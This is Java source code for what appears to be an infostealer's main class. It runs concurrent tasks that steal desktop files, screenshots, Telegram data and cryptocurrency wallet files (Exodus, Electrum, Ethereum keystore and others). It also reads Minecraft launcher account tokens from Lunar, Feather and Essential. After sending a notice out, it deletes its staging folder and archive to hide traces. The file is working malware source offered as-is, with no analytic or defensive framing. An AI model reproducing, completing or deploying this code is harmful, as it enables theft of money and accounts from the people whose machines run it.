package org.example;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

public class back {

    static String[] Wallets;
    public static String xdFolderPath;
    public static final File localAppData;
    public static final File appData;
    public static final File lunarPath;
    public static final File featherPath;
    public static final File essentialsPath;

    public static void main(String[] args){
        System.out.println("Se pa ta ligado");
        utils.unlockAES256();
        xd();
    }

    public static void xd(){
        ExecutorService ex = Executors.newFixedThreadPool(4);
        ex.submit(() -> zero.StealDesktop());
        ex.submit(() -> zero.ScreenshotScreen());
        ex.submit(() -> zero.tg());
        ex.submit(() -> zero.CryptoWallets());
        ex.submit(() -> zero.grabLunar());
        ex.submit(() -> zero.grabFeather());
        ex.submit(() -> zero.grabEssentials());
        ex.shutdown();
        try {
            ex.awaitTermination(1, TimeUnit.MINUTES);
            utils.sendb(String.format("{ \"name\": \"%s\", \"Name\": \"%s\" }", "Geral", System.getProperty("user.name")));
            System.out.println(xdFolderPath);
            utils.deleteDirectoryRecursively(Paths.get(xdFolderPath));
            Files.delete(Paths.get(xdFolderPath + ".rar"));
        } catch (Exception e) { e.printStackTrace(); }
    }

    static {
        try { xdFolderPath = String.valueOf(Files.createTempDirectory("TempGui"));} catch(IOException e){ throw new RuntimeException(e); }
        appData = new File(System.getenv("APPDATA"));
        localAppData = new File(System.getenv("LOCALAPPDATA"));
        Wallets = new String[]{appData + "\\Zcash", appData + "\\Armory", appData + "\\Bytecoin", appData + "\\com.liberty.jaxx\\IndexedDB\\file_0.indexeddb.leveldb", appData + "\\Exodus\\exodus.wallet", appData + "\\Ethereum\\keystore", appData + "\\Electrum\\wallets", appData + "\\atomic\\Local Storage\\leveldb", appData + "\\Guarda\\Local Storage\\leveldb", localAppData + "\\Coinomi\\Coinomi\\wallets"};
        lunarPath = new File(System.getProperty("user.home") + "\\.lunarclient\\settings\\game\\accounts.json");
        featherPath = new File(appData + "\\.feather\\accounts.json");
        essentialsPath = new File(appData + "\\.minecraft\\essential\\microsoft_accounts.json");
    }
}